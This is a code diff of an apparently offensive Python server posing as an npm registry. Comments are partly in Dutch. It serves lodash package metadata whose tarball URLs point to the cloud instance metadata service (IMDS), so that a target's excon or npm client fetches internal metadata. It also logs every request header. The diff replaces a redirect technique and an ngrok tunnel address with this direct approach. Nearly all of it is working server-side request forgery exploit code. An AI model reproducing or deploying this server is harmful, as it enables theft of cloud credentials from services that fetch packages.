@@ -11,7 +11,7 @@ PACKUMENT = json.dumps({
             "name": "lodash",
             "version": "4.18.0",
             "dist": {
-                "tarball": "https://d511-84-30-51-191.ngrok-free.app/lodash/-/lodash-4.18.0.tgz",
+                "tarball": INTERNAL + "lodash-4.18.0.tgz",
                 "shasum": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
             }
         },
@@ -19,7 +19,7 @@ PACKUMENT = json.dumps({
             "name": "lodash",
             "version": "4.17.21",
             "dist": {
-                "tarball": "https://d511-84-30-51-191.ngrok-free.app/lodash/-/lodash-4.17.21.tgz",
+                "tarball": INTERNAL + "lodash-4.17.21.tgz",
                 "shasum": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
             }
         }
@@ -32,25 +32,19 @@ class Handler(BaseHTTPRequestHandler):
         print(f"\n[REQUEST] {self.path}")
         print(f"  User-Agent: {ua}")
         for k, v in self.headers.items():
-            if k.lower() not in ("user-agent",):
+            if k.lower() != "user-agent":
                 print(f"  {k}: {v}")
 
-        is_npm = "npm/" in ua
-
-        if is_npm:
-            # npm client volgt redirects - stuur naar IMDS
-            print(f"[!] npm client gedetecteerd -> redirect naar {INTERNAL}")
-            self.send_response(301)
-            self.send_header("Location", INTERNAL)
-            self.end_headers()
+        if "npm/" in ua:
+            print(f"[!] npm client -> packument met IMDS tarball URL serveren")
         else:
-            # excon/Ruby - stuur valide JSON zodat npm wordt gespawned
-            print(f"[*] excon request -> valide packument teruggeven")
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.send_header("Content-Length", str(len(PACKUMENT)))
-            self.end_headers()
-            self.wfile.write(PACKUMENT)
+            print(f"[*] excon -> packument serveren")
+
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(PACKUMENT)))
+        self.end_headers()
+        self.wfile.write(PACKUMENT)
 
     def log_message(self, format, *args):
         pass
